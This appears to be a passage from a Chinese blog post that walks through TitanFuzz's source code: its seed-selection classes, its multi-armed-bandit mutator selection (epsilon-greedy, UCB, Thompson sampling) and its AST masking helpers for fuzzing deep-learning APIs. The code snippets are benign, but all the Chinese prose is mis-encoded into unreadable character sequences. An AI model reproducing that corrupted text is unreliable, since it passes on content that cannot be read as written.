self.library<br>)<br></code></pre></td></tr></table></figure><p><em>SnippetInfillArbitratyAPIè§util&#x2F;instrumentor.py</em></p></li><li><p>è°ƒç”¨_init_seedåˆå§‹åŒ–ç§å­ï¼Œç”±å­ç±»åˆ†åˆ«å®ç°</p></li><li><p>è°ƒç”¨_init_mutatoråˆå§‹åŒ–å˜å¼‚å™¨</p></li></ul></li><li><p>_init_mutatorï¼š</p><ul><li><p>æ ¹æ®self.mutator_setè®¾ç½®self.replace_type</p></li><li><p>æ ¹æ®self.mutator_selection_algoåˆå§‹åŒ–å˜å¼‚å™¨ç›¸å…³ï¼š</p><ul><li><p>heuristicï¼šself.replace_type_påˆå§‹åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">self.replace_type_p = &#123;<br>    <span class="hljs-string">&quot;argument&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;keyword&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;method&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;prefix&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;prefix-argument&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;suffix&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>    <span class="hljs-string">&quot;suffix-argument&quot;</span>: self.num_generated * <span class="hljs-number">3</span>,<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨å¤šè‡‚èµŒåšæœºç®—æ³•ï¼šè°ƒç”¨_init_multi_arm</p></li></ul></li></ul></li><li><p>_init_multi_armï¼šepsiloné»˜è®¤0.1ï¼Œreplace_type_pä¸¤ä¸ªç»´åº¦åˆ†åˆ«ä¸ºæˆåŠŸæ¬¡æ•°å’Œå¤±è´¥æ¬¡æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.replace_type_p = &#123;&#125;<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> self.replace_type:<br>    <span class="hljs-comment"># Initialize with 1 to avoid starving</span><br>    <span class="hljs-comment"># Change initial state to 0.5 following the Thompson Sampling algorithm</span><br>    self.replace_type_p[t] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]  <span class="hljs-comment"># success / total</span><br>self.epsilon = <span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure></li><li><p>selectionï¼š</p><ul><li><p>num_selectioné»˜è®¤æ˜¯1</p></li><li><p>è°ƒç”¨_select_seedé€‰ä¸€ä¸ªç§å­ï¼Œç”±å­ç±»å®ç°ï¼Œé€‰å®Œä¼šæŠŠç§å­ä»ç§å­åº“ä¸­ç§»é™¤ï¼ˆ<em>æ³¨ï¼šGAR_depthä¸ä¼š</em>ï¼‰</p></li><li><p>è°ƒç”¨_select_mutatoré€‰ä¸€ä¸ªreplace_type</p></li><li><p>å¦‚æœreplace_typeä¸ºargumentã€keywordæˆ–methodï¼Œè°ƒç”¨add_infillè¿›è¡Œmask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">(<br>    num_replaced,<br>    infill_code,<br>    original_code,<br>) = self.recursive_infill.add_infill(<br>    o_ast,<br>    add_keywords=(replace_type == <span class="hljs-string">&quot;keyword&quot;</span>),<br>    replace_method=(replace_type == <span class="hljs-string">&quot;method&quot;</span>),<br>)<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœæ²¡æœ‰å¯ä»¥maskçš„åˆ™ä½¿ç”¨SnippetInfillæŠŠargumentå…¨maskäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = SnippetInfill(<br>    mask_identifier=self.mask_identifier,<br>    api_call=self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[-<span class="hljs-number">1</span>],<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=self.library,<br>    replace_type=<span class="hljs-string">&quot;argument&quot;</span>,<br>)<br>num_replaced, infill_code, _ = infill.add_infill(code)<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœæ˜¯å…¶ä»–çš„replace_typeæ¯”å¦‚prefixå’Œsuffixï¼Œåˆ™ä½¿ç”¨SnippetInfillè¿›è¡Œmask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = SnippetInfill(<br>    mask_identifier=self.mask_identifier,<br>    api_call=self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[-<span class="hljs-number">1</span>],<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(self.api_call.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=self.library,<br>    replace_type=replace_type,<br>)<br>num_replaced, infill_code, _ = infill.add_infill(code)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>_select_mutatorï¼š</p><ul><li><p>heuristicï¼šåˆ†æ•°æ¦‚ç‡åŒ–éšæœºé€‰æ‹©</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_type = np.random.choice(<br>    self.replace_type,<br>    <span class="hljs-number">1</span>,<br>    p=[<br>        self.replace_type_p[x] / <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>(self.replace_type_p.values()))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.replace_type<br>    ],<br>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure></li><li><p>randomï¼šå°±éšæœºé€‰æ‹©</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_type = np.random.choice(self.replace_type)<br></code></pre></td></tr></table></figure></li><li><p>epsgreedyï¼šepsilon-greedy</p><ul><li>1-epsilonï¼šé€‰æ‹©å½“å‰ç´¯ç§¯å›æŠ¥æœ€é«˜çš„è‡‚</li><li>epsilonï¼šé€‰æ‹©æœªçŸ¥è‡‚</li></ul><p>è¿™æ—¶self.replace_type_pæ˜¯(success, total)ï¼Œä»¥success&#x2F;totalè®¡ç®—å›æŠ¥</p></li><li><p>ucbï¼šUpper Confidence Bound</p><p>è®¡ç®—æ¯ä¸ªè‡‚çš„ucbå€¼ï¼Œé€‰æ‹©ucbå€¼æœ€é«˜çš„è‡‚</p><img src="/2025/01/03/titanfuzz/ucb.png" class title="ucb"><ul><li>tï¼šå›åˆæ•°</li><li>niï¼šç¬¬iè‡‚è¢«é€‰æ‹©çš„æ¬¡æ•°ï¼Œä¼°è®¡å¥–åŠ±æ˜¯ç¬¬iè‡‚çš„å¹³å‡å¥–åŠ±ä¼°è®¡</li><li>ä¼°è®¡å¥–åŠ±ï¼šè¿™é‡Œä½¿ç”¨æˆåŠŸç‡success&#x2F;total</li></ul></li><li><p>tsï¼šThompson Sampling</p><ul><li><p>è´å¶æ–¯å®šç†</p><img src="/2025/01/03/titanfuzz/tom.png" class title="tom"><ul><li>P(A)ï¼šAçš„å…ˆéªŒæ¦‚ç‡</li><li>P(A|B)ï¼šå·²çŸ¥Bå‘ç”ŸAå‘ç”Ÿçš„æ¦‚ç‡ï¼ŒAçš„åéªŒæ¦‚ç‡</li><li>P(B)ï¼šBçš„å…ˆéªŒæ¦‚ç‡</li><li>P(B|A)ï¼šBçš„åéªŒæ¦‚ç‡</li></ul></li><li><p>åéªŒæ¦‚ç‡ &#x3D; ï¼ˆç›¸ä¼¼åº¦ * å…ˆéªŒæ¦‚ç‡ï¼‰&#x2F; æ ‡å‡†åŒ–å¸¸é‡</p><p>or</p><p>åéªŒæ¦‚ç‡ &#x3D; æ ‡å‡†ç›¸ä¼¼åº¦ * å…ˆéªŒæ¦‚ç‡</p></li><li><p>è¿™é‡ŒAæ˜¯æˆåŠŸæ¬¡æ•°ï¼ŒBæ˜¯å¤±è´¥æ¬¡æ•°</p></li><li><p>å…ˆéªŒåˆ†å¸ƒä½¿ç”¨betaåˆ†å¸ƒï¼Œè¿™æ ·åéªŒåˆ†å¸ƒä¹Ÿæ˜¯betaåˆ†å¸ƒ</p><img src="/2025/01/03/titanfuzz/beta.png" class title="beta"></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">scores = []<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.replace_type:<br>    alpha, n_t = self.replace_type_p[a]<br>    beta = n_t - alpha<br>    score_a = np.random.beta(alpha, beta)<br>    scores.append(score_a)<br>max_index = np.argmax(scores)<br><span class="hljs-keyword">return</span> self.replace_type[max_index]<br></code></pre></td></tr></table></figure></li></ul></li><li><p>_update_mutatorï¼š</p><ul><li><p>heuristicï¼šæ›´æ–°è¢«é€‰æ‹©çš„æ–¹æ³•çš„scoreï¼Œ<em>çœ‹æ³¨é‡Šå§</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># update the global counter</span><br><span class="hljs-comment"># roughly that score increases when at least 1/4 of generation is valid and unique</span><br>self.replace_type_p[replace_type] += <span class="hljs-built_in">len</span>(generations) - <span class="hljs-number">1</span> / <span class="hljs-number">3</span> * (<br>    self.num_generated - <span class="hljs-built_in">len</span>(generations)<br>)<br>self.replace_type_p[replace_type] = <span class="hljs-built_in">max</span>(<br>    <span class="hljs-number">1</span>, self.replace_type_p[replace_type]<br>)<br></code></pre></td></tr></table></figure></li><li><p>randomï¼šæ— éœ€æ›´æ–°</p></li><li><p>å¤šè‡‚èµŒåšæœºï¼šsuccesså’Œtotalåˆ†åˆ«+1</p></li></ul></li><li><p>updateï¼š</p><ul><li>è°ƒç”¨_update_seedæ›´æ–°ç§å­ï¼Œç”±å­ç±»å®ç°</li><li>è°ƒç”¨_update_mutatoræ›´æ–°å˜å¼‚ç­–ç•¥ç›¸å…³åˆ†æ•°</li><li>å¯¹äºæ¯ä¸ªç§å­è°ƒç”¨_add_new_seedæ·»åŠ ç§å­è¿›ç§å­åº“self.seedsï¼Œç”±å­ç±»å®ç°</li></ul></li><li><p>get_highest_order_outputï¼š</p><ul><li>highest_orderä¸ºæœ€å¤§å˜å¼‚å±‚æ•°ï¼Œnä¸ºå¯¹åº”ç§å­çš„info</li><li>å¹¶è¾“å‡ºmax_depthã€é‡å¤api callæ¬¡æ•°å’Œapi callä¸­å¸¦keywordçš„ä¸ªæ•°</li></ul></li></ul><h3 id="class-GA-Random"><a href="#class-GA-Random" class="headerlink" title="class GA_Random"></a>class GA_Random</h3><ul><li><p>_init_seedï¼šå•çº¯append</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">self.seeds = []<br>self.info_code = &#123;&#125;<br><span class="hljs-keyword">for</span> idx, seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(initial_seeds):<br>    self.seeds.append(seed)<br>    self.info_code[seed] = &#123;<br>        <span class="hljs-string">&quot;mutation_layer&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;used_as_seed&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;parent&quot;</span>: <span class="hljs-literal">None</span>,<br>        <span class="hljs-string">&quot;filename&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;_&#123;&#125;&#123;&#125;.py&quot;</span>.<span class="hljs-built_in">format</span>(self.api_call, <span class="hljs-string">&quot;seed&quot;</span>, idx + <span class="hljs-number">1</span>),<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>_select_seedï¼š</p><p>å°±æ˜¯éšæœºé€‰å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_select_seed</span>(<span class="hljs-params">self</span>):<br>    code = np.random.choice(self.seeds)<br>    self.seeds.remove(code)<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure></li><li><p>_update_seedï¼š</p><p>æ›´æ–°çš„infoï¼Œå†æŠŠç§å­æ”¾å›å»ï¼Œ<em>emmmmm</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_update_seed</span>(<span class="hljs-params">self, code, value</span>):<br>    self.info_code[code][<span class="hljs-string">&quot;used_as_seed&quot;</span>] += self.num_generated<br>    self.seeds.append(code)<br></code></pre></td></tr></table></figure></li><li><p>_add_new_seedï¼š</p><p>å°†ç”Ÿæˆçš„outputï¼ˆcodeï¼‰æ”¾è¿›ç§å­åº“self.seeds</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> code <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.info_code:<br>    self.num_valid += <span class="hljs-number">1</span><br>    self.info_code[code] = &#123;<br>        <span class="hljs-string">&quot;mutation_layer&quot;</span>: self.info_code[seed][<span class="hljs-string">&quot;mutation_layer&quot;</span>] + <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;used_as_seed&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;parent&quot;</span>: seed,<br>        <span class="hljs-string">&quot;replace_type&quot;</span>: replace_type,<br>        <span class="hljs-string">&quot;round&quot;</span>: rd,<br>        <span class="hljs-string">&quot;filename&quot;</span>: filename,<br>    &#125;<br>    self.seeds.append(code)<br></code></pre></td></tr></table></figure></li></ul><h3 id="class-GA-Coverage"><a href="#class-GA-Coverage" class="headerlink" title="class GA_Coverage"></a>class GA_Coverage</h3><ul><li>_init_seedï¼šåŒGA_Random</li><li>_select_seedï¼šåŒGA_Coverage</li><li>updateï¼šæ¯”GAå¤šäº†ä¸ªadd_flagï¼Œåªæœ‰è¦†ç›–ç‡æ›´æ–°æ‰æ·»åŠ ç§å­</li><li>_update_seedï¼šåŒGA_Coverage</li><li>_add_new_seedï¼šåŒGA_Coverage</li></ul><h3 id="class-GAR-depth"><a href="#class-GAR-depth" class="headerlink" title="class GAR_depth"></a>class GAR_depth</h3><ul><li><p>_compute_fitness_scoreï¼š</p><ul><li><p>è·å–max_depth</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">max_depth = DepthFinder(self.library).max_depth(code)<br></code></pre></td></tr></table></figure><p><em>DepthFinderè§util&#x2F;instrumentor.py</em></p></li><li><p>è·å–unique_callså’Œex_repeats</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">unique_calls, ex_repeats, repeats = UniqueFinder(self.library).count(code)<br></code></pre></td></tr></table></figure><p><em>UniqueFinderè§util&#x2F;instrumentor.py</em></p></li><li><p>ä¸åŒçš„fitnessè®¡ç®—æ–¹å¼ä¸åŒï¼š</p><ul><li>fitnessï¼šunique_calls + max_depth - ex_repeats</li><li>fitnessueï¼šunique_calls - ex_repeats</li><li>fitnessudï¼šunique_calls + max_depth</li><li>fitnessdeï¼šmax_depth - ex_repeats</li></ul></li></ul></li><li><p>_init_seedï¼š</p><ul><li><p>å¯¹äºæ¯ä¸ªseedï¼š</p><ol><li>è°ƒç”¨_compute_fitness_scoreæ‰“åˆ†</li><li>å–é•¿åº¦çš„è´Ÿæ•°</li></ol><p>ä»¥è¿™ä¸¤ä¸ªæ•°ä¸ºæƒé‡ï¼Œå°†æ‰€æœ‰çš„seedå­˜å…¥ä¸€ä¸ªå°æ ¹å †</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">heapq.heappush(<br>    self.seeds,<br>    (self._compute_fitness_score(seed), -<span class="hljs-built_in">len</span>(seed.splitlines()), seed),<br>)<br></code></pre></td></tr></table></figure></li><li><p>ä¿è¯ç§å­æ± ä¸­ç§å­æ•°å°äºself.seed_pool_size</p></li></ul></li><li><p>_select_seedï¼š</p><p>ä»¥softmaxè¿‡çš„scoresä¸ºæ¦‚ç‡ï¼Œéšæœºé€‰å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_softmax</span>(<span class="hljs-params">self, x</span>):<br>    e_x = np.exp(x - np.<span class="hljs-built_in">max</span>(x))<br>    <span class="hljs-keyword">return</span> e_x / e_x.<span class="hljs-built_in">sum</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_select_seed</span>(<span class="hljs-params">self</span>):<br>    _seed_scores = [rec[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> rec <span class="hljs-keyword">in</span> self.seeds]<br>    codes = [rec[-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> rec <span class="hljs-keyword">in</span> self.seeds]<br>    probs = self._softmax(_seed_scores)<br>    code = np.random.choice(codes, p=probs)<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure></li><li><p>_update_seedï¼šåªæ›´æ–°info</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_update_seed</span>(<span class="hljs-params">self, code, value</span>):<br>self.info_code[code][<span class="hljs-string">&quot;used_as_seed&quot;</span>] += self.num_generated<br></code></pre></td></tr></table></figure></li><li><p>_add_new_seedï¼šå¤šäº†ä¸€æ­¥ç»™ç§å­æ‰“åˆ†ï¼Œpushè¿›å°æ ¹å †ï¼Œå¹¶popå‡ºä½åˆ†ç§å­ç›´åˆ°ç§å­æ± æ»¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">heapq.heappush(<br>    self.seeds,<br>    (self._compute_fitness_score(code), -<span class="hljs-built_in">len</span>(code.splitlines()), code),<br>)<br><span class="hljs-keyword">if</span> self.seed_pool_size &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.seeds) &gt; self.seed_pool_size:<br>        heapq.heappop(self.seeds)<br></code></pre></td></tr></table></figure></li></ul><h2 id="instrumentor-py"><a href="#instrumentor-py" class="headerlink" title="instrumentor.py"></a>instrumentor.py</h2><p>pythonçš„astæ ‘é»˜è®¤éå†æ–¹å¼ä¸ºå…ˆæ ¹éå†ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªastæ ‘çš„ä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-number">100</span><br>a = b<br>c = a.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>a.to_tensor(<span class="hljs-number">1</span>, a = <span class="hljs-number">10</span>).reshape(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><img src="/2025/01/03/titanfuzz/ast.png" class title="ast"><h3 id="class-SnippetInfill"><a href="#class-SnippetInfill" class="headerlink" title="class SnippetInfill"></a>class SnippetInfill</h3><p>ç»§æ‰¿è‡ªast.NodeTransformer</p><ul><li><p>visitï¼šéœ€è¦å•ç‹¬å¤„ç†ast.Call</p></li><li><p>visit_Callï¼š</p><ul><li><p>è·å–æ‰€æœ‰apiè°ƒç”¨ï¼Œè®¡æ•°self.num_replaced</p></li><li><p>å¦‚æœself.replaceä¸ºFalseåˆ™åªæ˜¯è¿”å›</p></li><li><p>å¦‚æœself.replace_typeåŒ…å«argumentï¼Œåˆ™è®¾ç½®argsä¸ºmaskå¹¶æ¸…é™¤æ‰€æœ‰keywords</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;argument&quot;</span> <span class="hljs-keyword">in</span> self.replace_type:<br>    node.args = [ast.Constant(value=self.mask_identifier)]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(node):<br>        node.keywords = []<br>    self.replace = <span class="hljs-literal">False</span>  <span class="hljs-comment"># do not replace any later api calls</span><br></code></pre></td></tr></table></figure></li><li><p>è®¡æ•°æœ€åä¸€ä¸ªç›®æ ‡apiå‡ºç°çš„è¡Œæ•°åˆ°self.line_no</p></li></ul></li><li><p>add_infillï¼š</p><ul><li>å…ˆparseå†unparseï¼Œå¯ä»¥å»æ‰å¤šä½™çš„æ¢è¡Œ</li><li>å…ˆvisitä¸€æ¬¡è®¡æ•°self.num_replaced</li><li>å†visitä¸€æ¬¡è¿›è¡Œæ›´æ”¹</li><li>åˆ†ç±»self.replace_typeï¼š<ul><li>argumentï¼šmaskæ‰€æœ‰ç›®æ ‡apiçš„args</li><li>prefixï¼šå»æ‰self.line_noå‰çš„è‹¥å¹²è¡Œï¼Œå¹¶è¡¥å……import</li><li>suffixï¼šå»æ‰self.line_noåçš„è‹¥å¹²è¡Œ</li><li>prefix-argumentï¼šç»¼åˆä¸¤è€…</li><li>suffix-argumentï¼šç»¼åˆä¸¤è€…</li></ul></li><li>è¿”å›ï¼š<ul><li>maskè®¡æ•°ï¼šself.num_replaced</li><li>makså®Œçš„codeï¼šinfill_code</li><li>åŸå§‹codeï¼šoriginal_code</li></ul></li></ul></li></ul><h3 id="class-SnippetInfillArbitratyAPI"><a href="#class-SnippetInfillArbitratyAPI" class="headerlink" title="class SnippetInfillArbitratyAPI"></a>class SnippetInfillArbitratyAPI</h3><p>ç±»ä¼¼SnippetInfill</p><ul><li><p>visit_Callï¼šæ”¶é›†æ‰€æœ‰åŒ…æ‹¬åœ¨self.full_api_listä¸­çš„api callç»“ç‚¹ï¼ŒåŠ å…¥self.call_nodes</p></li><li><p>add_infillï¼š</p><ul><li><p>ä»self.call_nodeséšæœºé€‰æ‹©ä¸€ä¸ªç»“ç‚¹maskï¼š</p><ul><li><p>æ›¿æ¢æ–¹æ³•ï¼šmask Attribute</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_node.func = ast.Attribute(<br>    value=ast.Name(<span class="hljs-built_in">id</span>=self.lib_prefix),<br>    attr=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>),<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.&lt;|mask:<span class="hljs-number">0</span>|&gt;(A, B)<br></code></pre></td></tr></table></figure></li><li><p>æ›¿æ¢argumentï¼šmask argsï¼Œæ¸…ç©ºkeywords</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_node.args = [<br>ast.Constant(value=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br>]<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(replace_node):<br>    replace_node.keywords = []<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.mm(&lt;|mask:<span class="hljs-number">0</span>|&gt;)<br></code></pre></td></tr></table></figure></li><li><p>æ›¿æ¢keywordsï¼šæ·»åŠ ä¸€ä¸ªkeyword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_node.keywords.append(<br>    ast.keyword(<br>        arg=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>),<br>        value=ast.Constant(value=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)),<br>    )<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.mm(A, B, &lt;|mask:<span class="hljs-number">0</span>|&gt; = &lt;|mask:<span class="hljs-number">1</span>|&gt;)<br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h3 id="class-DepthFinder"><a href="#class-DepthFinder" class="headerlink" title="class DepthFinder"></a>class DepthFinder</h3><p>ç»§æ‰¿è‡ªast.NodeTransformer</p><p>depthè®¡ç®—æ–¹å¼ï¼š</p><ul><li><p>æ²¡æœ‰å‚æ•°ï¼Œåªæœ‰apiè°ƒç”¨ï¼Œåˆ™depthä¸ºapiå±‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a = lib.getnum()<br></code></pre></td></tr></table></figure><p><em>ä¾‹ï¼šaçš„depthæ˜¯1</em></p></li><li><p>æœ‰å‚æ•°ï¼Œåˆ™depthä¸ºmax(å‚æ•°çš„depth+apiå±‚æ•°)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b = lib.add(lib.sub(a, <span class="hljs-number">1</span>), <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><em>ä¾‹ï¼šbçš„depthæ˜¯2+1&#x3D;3</em></p></li></ul><p>ç›¸å…³æˆå‘˜å«ä¹‰ï¼š</p><ul><li>api_depthï¼šç›®æ ‡åº“apiè°ƒç”¨å±‚æ•°</li><li>current_varï¼šè¢«èµ‹å€¼çš„å˜é‡ï¼Œç¬¬ä¸€æ¬¡å‡ºç°æ—¶æ˜¯å¾…è®¡ç®—çš„depthï¼Œéœ€è¦å¿½ç•¥</li></ul><p>ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = lib.getnum()                <span class="hljs-comment"># a : 1</span><br>b = lib.getnum(lib.getnum())     <span class="hljs-comment"># b : 2</span><br>c = lib.add(b, lib.add(a, a))    <span class="hljs-comment"># b ? 1 + 2, a ? 2 + 1, c : 3</span><br>b = lib.add(lib.add(b, c), a)    <span class="hljs-comment"># b ? 2 + 2, c ? 3 + 2, a ? 1 + 1, b : 5</span><br></code></pre></td></tr></table></figure><p><em>max_depth&#x3D;5</em></p><h3 id="class-SearchAllCall"><a href="#class-SearchAllCall" 